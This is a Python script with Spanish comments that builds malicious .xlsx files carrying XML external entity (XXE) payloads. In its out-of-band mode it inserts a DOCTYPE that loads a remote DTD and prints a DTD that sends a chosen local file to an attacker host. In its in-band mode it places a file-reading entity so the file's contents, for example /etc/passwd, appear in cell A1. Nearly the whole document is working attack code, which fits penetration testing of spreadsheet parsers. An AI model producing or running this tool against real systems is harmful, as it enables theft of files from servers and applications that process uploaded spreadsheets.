#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import argparse
import zipfile
import shutil
import tempfile
import sys
import xml.etree.ElementTree as ET
import re

# --- Mensajes de color para la consola ---
class colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    ENDC = '\033[0m'

def print_info(message):
    """Imprime un mensaje informativo."""
    print(f"{colors.YELLOW}[*] {message}{colors.ENDC}")

def print_success(message):
    """Imprime un mensaje de éxito."""
    print(f"{colors.GREEN}[+] {message}{colors.ENDC}")

def print_error(message):
    """Imprime un mensaje de error y sale del script."""
    print(f"{colors.RED}[-] {message}{colors.ENDC}", file=sys.stderr)
    sys.exit(1)

def print_instruction(message):
    """Imprime una instrucción importante para el usuario."""
    print(f"{colors.BLUE}{message}{colors.ENDC}")

def inject_xxe_payload(input_file, output_file, attacker_host, file_to_read=None, target_choice=1, mode='oob'):
    """
    Inyecta un payload XXE en un archivo .xlsx.
    """
    if not os.path.exists(input_file):
        print_error(f"El archivo de entrada '{input_file}' no fue encontrado.")

    temp_dir = tempfile.mkdtemp(prefix="xxe_excel_")
    print_info(f"Directorio temporal creado en: {temp_dir}")

    try:
        print_info(f"Descomprimiendo '{input_file}'...")
        with zipfile.ZipFile(input_file, 'r') as zip_ref:
            zip_ref.extractall(temp_dir)
        print_success("Archivo descomprimido correctamente.")

        if mode == 'oob':
            # --- MODO OUT-OF-BAND ---
            print_info("Modo de ataque: Out-of-Band (OOB)")
            target_xml_file = TARGET_MAP.get(target_choice)
            target_path = os.path.join(temp_dir, target_xml_file)
            if not os.path.exists(target_path):
                print_error(f"No se pudo encontrar el archivo objetivo '{target_xml_file}'.")
            
            print_info(f"Archivo objetivo para la inyección: '{target_xml_file}'")
            
            if file_to_read:
                payload = f'<!DOCTYPE r [<!ENTITY % xxe SYSTEM "http://{attacker_host}/exploit.dtd"> %xxe;]>'
                dtd_content = f'''<!ENTITY % file SYSTEM "file://{file_to_read}">
<!ENTITY % exfil "<!ENTITY &#37; send SYSTEM 'http://{attacker_host}/?content=%file;'>">
%exfil;
%send;'''
                print("\n" + "="*60)
                print_instruction("¡ACCIÓN REQUERIDA (OOB)! Para capturar el archivo, aloja 'exploit.dtd' en tu servidor con este contenido:")
                print(dtd_content)
                print("="*60 + "\n")
            else:
                payload = f'<!DOCTYPE r [<!ENTITY % xxe SYSTEM "http://{attacker_host}/pwn.dtd"> %xxe;]>'
                print_instruction(f"\n[+] Inicia un listener en '{attacker_host}' para confirmar la vulnerabilidad.\n")

            with open(target_path, 'r', encoding='utf-8') as f:
                original_content = f.read()
            
            xml_declaration_end = original_content.find('?>')
            if xml_declaration_end == -1:
                print_error(f"No se pudo encontrar la declaración XML en '{target_xml_file}'.")
            
            injection_point = xml_declaration_end + 2
            modified_content = (original_content[:injection_point] + '\n' + payload + original_content[injection_point:])
            
            with open(target_path, 'w', encoding='utf-8') as f:
                f.write(modified_content)
            print_success(f"Payload OOB inyectado en '{target_xml_file}'.")

        elif mode == 'inband':
            # --- MODO IN-BAND (sharedStrings.xml + sheet1.xml) ---
            print_info("Modo de ataque: In-Band (sharedStrings.xml)")

            # Paso 1: Inyectar en sharedStrings.xml
            shared_strings_path = os.path.join(temp_dir, 'xl', 'sharedStrings.xml')
            if not os.path.exists(shared_strings_path):
                print_info(f"'{shared_strings_path}' no existe. Creándolo...")
                os.makedirs(os.path.dirname(shared_strings_path), exist_ok=True)
                with open(shared_strings_path, 'w', encoding='utf-8') as f:
                    f.write('<?xml version="1.0" encoding="UTF-8" standalone="yes"?><sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="0" uniqueCount="0"></sst>')

            with open(shared_strings_path, 'r', encoding='utf-8') as f:
                original_content = f.read()

            declaration_match = re.match(r'<\?xml[^>]*\?>', original_content)
            xml_declaration = declaration_match.group(0) if declaration_match else ''
            
            count_match = re.search(r'count="(\d+)"', original_content)
            unique_count_match = re.search(r'uniqueCount="(\d+)"', original_content)
            string_index = int(unique_count_match.group(1)) if unique_count_match else 0
            
            file_uri = file_to_read.replace('\\', '/')
            if not file_uri.startswith('/'):
                file_uri = '/' + file_uri
            dtd = f'<!DOCTYPE sst [ <!ENTITY file SYSTEM "file://{file_uri}"> ]>'
            
            new_string_element = f'<si><t>&file;</t></si>'
            
            content_no_decl = original_content[len(xml_declaration):]
            content_no_decl = content_no_decl.replace('</sst>', new_string_element + '</sst>')
            
            if count_match:
                new_count = int(count_match.group(1)) + 1
                content_no_decl = re.sub(r'count="\d+"', f'count="{new_count}"', content_no_decl, 1)
            if unique_count_match:
                new_unique_count = int(unique_count_match.group(1)) + 1
                content_no_decl = re.sub(r'uniqueCount="\d+"', f'uniqueCount="{new_unique_count}"', content_no_decl, 1)

            final_content = f'{xml_declaration}\n{dtd}\n{content_no_decl}'
            with open(shared_strings_path, 'w', encoding='utf-8') as f:
                f.write(final_content)
            print_success(f"Payload In-Band inyectado en 'xl/sharedStrings.xml'.")

            # Paso 2: Modificar sheet1.xml para apuntar a la nueva cadena (usando Regex)
            sheet_path = os.path.join(temp_dir, 'xl', 'worksheets', 'sheet1.xml')
            if not os.path.exists(sheet_path):
                print_error(f"No se encontró 'xl/worksheets/sheet1.xml'. El ataque In-Band requiere al menos una hoja.")

            with open(sheet_path, 'r', encoding='utf-8') as f:
                sheet_content = f.read()

            new_cell_str = f'<c r="A1" t="s"><v>{string_index}</v></c>'

            # Buscar si la celda A1 ya existe en la fila 1
            row_1_match = re.search(r'<row r="1"[^>]*>.*?</row>', sheet_content, re.DOTALL)
            if row_1_match:
                row_1_content = row_1_match.group(0)
                # Si la celda A1 existe, reemplazarla
                if re.search(r'<c r="A1"[^>]*>', row_1_content):
                    modified_row = re.sub(r'<c r="A1"[^>]*>.*?</c>', new_cell_str, row_1_content)
                    sheet_content = sheet_content.replace(row_1_content, modified_row)
                # Si la fila 1 existe pero no la celda A1, añadirla
                else:
                    modified_row = re.sub(r'(<row r="1"[^>]*>)', r'\1' + new_cell_str, row_1_content)
                    sheet_content = sheet_content.replace(row_1_content, modified_row)
            # Si ni siquiera la fila 1 existe, la creamos
            else:
                new_row = f'<row r="1">{new_cell_str}</row>'
                sheet_content = sheet_content.replace('</sheetData>', new_row + '</sheetData>')

            with open(sheet_path, 'w', encoding='utf-8') as f:
                f.write(sheet_content)
                
            print_success("La celda A1 en 'sheet1.xml' ha sido modificada para mostrar el resultado.")
            print_instruction("\n[+] Inyección In-Band completada. Abre el archivo de salida en una aplicación vulnerable.")
            print_instruction("    El contenido del archivo debería aparecer en la celda A1 del documento.\n")

        # --- Reempaquetar el archivo .xlsx ---
        print_info(f"Creando el archivo de salida '{output_file}'...")
        output_filename_base = os.path.splitext(output_file)[0]
        shutil.make_archive(output_filename_base, 'zip', temp_dir)
        shutil.move(f"{output_filename_base}.zip", output_file)
        print_success(f"Archivo modificado guardado como '{output_file}'.")

    except Exception as e:
        print_error(f"Ocurrió un error inesperado: {e}")
    finally:
        print_info(f"Limpiando el directorio temporal...")
        shutil.rmtree(temp_dir)
        print_success("Limpieza completada.")

if __name__ == "__main__":
    TARGET_MAP = {
        1: 'xl/workbook.xml',
        2: 'xl/sharedStrings.xml',
        3: 'xl/worksheets/sheet1.xml',
        4: '[Content_Types].xml'
    }
    target_help_text = "[Opcional para modo OOB] Elige el archivo XML objetivo usando un número:\n"
    for num, path in TARGET_MAP.items():
        default_str = " (Defecto)" if num == 1 else ""
        target_help_text += f"  {num}: {path}{default_str}\n"

    parser = argparse.ArgumentParser(
        description="Herramienta para inyectar payloads XXE en archivos .xlsx.",
        epilog="""Ejemplos de uso:
  1. Detección OOB (Out-of-Band):
     python3 %(prog)s -i in.xlsx -o out.xlsx -H srv.com

  2. Exfiltración OOB de /etc/passwd:
     python3 %(prog)s -i in.xlsx -o out.xlsx -H srv.com -f /etc/passwd

  3. Exfiltración In-Band de /etc/passwd (el contenido aparecerá en la celda A1):
     python3 %(prog)s -i in.xlsx -o out.xlsx -m inband -f /etc/passwd
""",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("-i", "--input", required=True, help="Archivo .xlsx de entrada.")
    parser.add_argument("-o", "--output", required=True, help="Nombre del archivo .xlsx de salida modificado.")
    parser.add_argument("-m", "--mode", choices=['oob', 'inband'], default='oob', help="Modo de ataque: 'oob' (Out-of-Band) o 'inband' (local, en celda).")
    parser.add_argument("-H", "--host", help="Host del atacante (Requerido para modo 'oob').")
    parser.add_argument("-f", "--file", dest="filepath", help="Ruta absoluta al archivo local que se desea leer en la víctima.")
    parser.add_argument("-t", "--target", dest="target_choice", type=int, default=1, help="[Solo modo OOB] Elige el archivo XML objetivo.")

    args = parser.parse_args()

    if args.mode == 'oob' and not args.host:
        parser.error("--mode 'oob' requiere el argumento -H/--host.")
    if args.mode == 'inband' and not args.filepath:
        parser.error("--mode 'inband' requiere el argumento -f/--file.")
    if args.target_choice not in TARGET_MAP:
        print_error(f"Opción de objetivo inválida: '{args.target_choice}'. Usa un número del 1 al {len(TARGET_MAP)}.")

    inject_xxe_payload(args.input, args.output, args.host, args.filepath, args.target_choice, args.mode)
